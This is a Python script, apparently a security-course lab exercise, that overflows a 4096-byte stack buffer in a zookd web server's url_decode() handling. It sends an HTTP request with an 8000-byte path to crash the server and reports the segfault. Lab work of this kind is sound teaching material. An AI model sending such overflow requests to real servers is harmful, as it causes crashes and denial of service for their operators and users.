#!/usr/bin/env python3
"""
Exercise 2 - Buffer Overflow Exploit
Target: url_decode() vulnerability in http_request_line()

The url_decode() function has no bounds checking on the destination buffer.
The reqpath buffer in process_client() is 4096 bytes.
We can overflow it by sending a very long URL path.
"""
import sys
import socket

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

host = sys.argv[1]
port = int(sys.argv[2])

print("[*] Buffer Overflow Exploit - Exercise 2")
print("[*] =======================================")
print("[*]")
print("[*] Target: url_decode() in http_request_line()")
print("[*] reqpath buffer: 4096 bytes")
print("[*] url_decode() has NO bounds checking!")
print("[*]")

# Create payload larger than reqpath buffer (4096 bytes)
# This will overflow the stack in process_client()
payload_size = 8000
payload = b"A" * payload_size

# Build HTTP request
request = b"GET /" + payload + b" HTTP/1.0\r\n\r\n"

print(f"[*] Payload size: {payload_size} bytes")
print(f"[*] Total request: {len(request)} bytes")
print("[*]")
print("[!] Sending exploit...")
print("[!] This should cause segfault in process_client()!")
print("[!]")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(request)
    
    try:
        response = sock.recv(4096)
        if response:
            print("[*] Server response:")
            print(response.decode('utf-8', errors='replace')[:500])
        else:
            print("[!] No response - server crashed!")
    except Exception as e:
        print(f"[!] Connection error: {e}")
        print("[!] Server likely crashed!")
    
    sock.close()
    
except Exception as e:
    print(f"[!] Error: {e}")

print("[*]")
print("[*] Check zookd terminal for:")
print("[*]   'Child process XXXX terminated incorrectly, receiving signal 11'")
print("[*]")
print("[*] Check dmesg:")
print("[*]   dmesg | tail -5")
print("[*]")
